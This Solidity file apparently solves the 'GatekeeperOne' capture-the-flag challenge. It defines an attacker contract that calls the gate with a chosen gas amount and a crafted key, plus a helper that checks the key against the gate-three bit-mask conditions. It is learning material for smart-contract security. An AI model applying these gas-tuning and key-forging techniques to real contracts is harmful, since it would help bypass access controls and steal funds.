// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import {GatekeeperOne} from "./gatekeeper.sol";
contract GatekeeperAttacker {
  function enter(address gate,bytes8 key,uint256 gasToUse) external {
    //GatekeeperOne(gate).enter{gas:gasToUse}(key);
    GatekeeperOne(gate).enter.gas(gasToUse)(key);
  }
  
  function checkGate3(bytes8 key) external view {
    require(uint32(uint64(key)) == uint16(uint64(key)),"GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(key)) != uint64(key),"GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(key)) == uint16(uint160(tx.origin)),"GatekeeperOne: invalid gateThree part three");
  }
}